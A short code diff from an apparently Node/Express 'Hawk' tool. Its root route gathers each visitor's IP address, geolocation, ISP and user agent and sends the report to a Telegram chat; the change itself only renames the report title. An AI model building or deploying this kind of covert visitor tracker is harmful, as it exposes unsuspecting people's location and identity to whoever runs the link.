@@ -36,7 +36,7 @@ app.get('/', async (req, res) => {
     const platform = req.headers['user-agent-platform']; // You can customize this header
 
     // Create a message that includes IP, location, ISP, user-agent, and platform
-    const message = `Hawk Info Report 🦅\nUser IP: ${clientIP}\nCountry: ${country}\nState/Region: ${region}\nCity: ${city}\nISP: ${org}\nUser Agent: ${userAgent}\nPlatform: ${platform}`;
+    const message = `Hawk Tool Report 🦅\nUser IP: ${clientIP}\nCountry: ${country}\nState/Region: ${region}\nCity: ${city}\nISP: ${org}\nUser Agent: ${userAgent}\nPlatform: ${platform}`;
 
     if (config.telegram.enabled) {
       // Send the message to the specified Telegram chat ID
